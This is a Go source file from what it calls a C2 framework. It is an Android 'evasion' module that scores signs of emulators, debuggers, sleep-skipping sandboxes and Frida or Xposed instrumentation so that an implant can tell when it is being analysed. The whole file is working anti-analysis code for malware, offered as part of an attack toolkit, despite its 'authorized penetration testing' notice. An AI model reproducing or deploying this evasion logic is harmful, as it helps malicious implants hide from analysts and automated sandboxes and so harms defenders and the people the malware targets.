//go:build android

package evasion

/*
	SUDOSOC-C2 Framework — Android Sandbox / Emulator Detection
	Copyright (C) 2026  sudosoc — Seif

	Authorized penetration testing use only.

	Detection layers:
	  1. Build properties — /system/build.prop (world-readable, always works)
	  2. Emulator device nodes — /dev/qemu_pipe, /dev/socket/qemud, etc.
	  3. Debugger check — TracerPid in /proc/self/status
	  4. Sleep canary — time-skipping sandbox acceleration
	  5. Process environment — signs of dynamic analysis tooling
*/

import (
	"bufio"
	"os"
	"strings"
	"time"
)

// SandboxReport holds the detection result and evidence.
type SandboxReport struct {
	Detected bool
	Score    int
	Reasons  []string
}

// IsSandbox returns true if the device looks like an emulator or
// automated analysis environment.
func IsSandbox() bool {
	return Sandbox().Detected
}

// Sandbox runs all Android-specific heuristics and returns a scored report.
// Threshold: score >= 4 → detected (requires at least one strong signal).
func Sandbox() SandboxReport {
	r := SandboxReport{}

	// Strong signals (score 5 each)
	if androidBuildPropEmulator(&r) {
		r.Score += 5
	}
	if androidTracerPid(&r) {
		r.Score += 5
	}

	// Moderate signals (score 3 each)
	if androidEmulatorFiles(&r) {
		r.Score += 3
	}
	if androidSleepSkipped(&r) {
		r.Score += 3
	}

	// Weak signals (score 2 each)
	if androidAnalysisEnv(&r) {
		r.Score += 2
	}

	r.Detected = r.Score >= 4
	return r
}

// androidBuildPropEmulator reads /system/build.prop which is world-readable
// on all Android versions. Checks for well-known emulator property values.
func androidBuildPropEmulator(r *SandboxReport) bool {
	f, err := os.Open("/system/build.prop")
	if err != nil {
		// Can't read → assume real device (conservative)
		return false
	}
	defer f.Close()

	// key → list of substrings in the value that indicate emulator
	indicators := map[string][]string{
		"ro.kernel.qemu":          {"1"},
		"ro.hardware":             {"goldfish", "ranchu", "vbox86"},
		"ro.product.manufacturer": {"genymotion", "google"},
		"ro.product.model": {
			"android sdk built for",
			"sdk_gphone",
			"emulator",
			"google_sdk",
			"android sdk",
		},
		"ro.product.name":   {"sdk_gphone", "vbox86p", "generic_x86", "generic_arm"},
		"ro.product.device": {"generic", "vbox86p", "emulator64"},
		"ro.build.tags":     {"test-keys"},
		"ro.debuggable":     {"1"},
	}

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if len(line) == 0 || line[0] == '#' {
			continue
		}
		idx := strings.IndexByte(line, '=')
		if idx < 1 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.ToLower(strings.TrimSpace(line[idx+1:]))
		if patterns, ok := indicators[key]; ok {
			for _, p := range patterns {
				if strings.Contains(val, p) {
					r.Reasons = append(r.Reasons, "prop:"+key)
					return true
				}
			}
		}
	}
	return false
}

// androidEmulatorFiles checks for device nodes and files that only
// exist inside QEMU/Goldfish/Ranchu Android emulators.
func androidEmulatorFiles(r *SandboxReport) bool {
	targets := []string{
		"/dev/socket/qemud",          // QEMU device socket
		"/dev/qemu_pipe",             // QEMU pipe
		"/system/bin/qemu-props",     // QEMU property reader
		"/sys/qemu_trace",            // QEMU trace node
		"/system/lib/libc_malloc_debug_qemu.so", // goldfish malloc lib
		"/system/bin/androVM-prop",   // Genymotion
		"/system/bin/vboxservice",    // VirtualBox (BlueStacks)
		"/proc/tty/drivers",          // present in some emulators, not real devices
	}
	for _, p := range targets {
		if _, err := os.Stat(p); err == nil {
			r.Reasons = append(r.Reasons, "file:"+p)
			return true
		}
	}
	return false
}

// androidTracerPid reads /proc/self/status and returns true if
// a debugger is attached (TracerPid != 0).
func androidTracerPid(r *SandboxReport) bool {
	f, err := os.Open("/proc/self/status")
	if err != nil {
		return false
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "TracerPid:") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[1] != "0" {
			r.Reasons = append(r.Reasons, "tracer:"+fields[1])
			return true
		}
		return false
	}
	return false
}

// androidSleepSkipped detects sandbox time-acceleration by measuring
// how long a 1.5 s sleep actually takes.
func androidSleepSkipped(r *SandboxReport) bool {
	start := time.Now()
	time.Sleep(1500 * time.Millisecond)
	if time.Since(start) < 1000*time.Millisecond {
		r.Reasons = append(r.Reasons, "sleep-skip")
		return true
	}
	return false
}

// androidAnalysisEnv checks environment variables and /proc/self/maps
// for signs of dynamic instrumentation frameworks (Frida, Xposed).
func androidAnalysisEnv(r *SandboxReport) bool {
	// Check for Frida agent in /proc/self/maps
	maps, err := os.ReadFile("/proc/self/maps")
	if err == nil {
		mapsStr := strings.ToLower(string(maps))
		for _, sig := range []string{"frida", "xposed", "substrate", "cydia"} {
			if strings.Contains(mapsStr, sig) {
				r.Reasons = append(r.Reasons, "maps:"+sig)
				return true
			}
		}
	}

	// Check environment for analysis indicators
	for _, env := range os.Environ() {
		low := strings.ToLower(env)
		for _, sig := range []string{"frida", "xposed", "debug", "inject"} {
			if strings.Contains(low, sig) {
				r.Reasons = append(r.Reasons, "env:"+sig)
				return true
			}
		}
	}
	return false
}
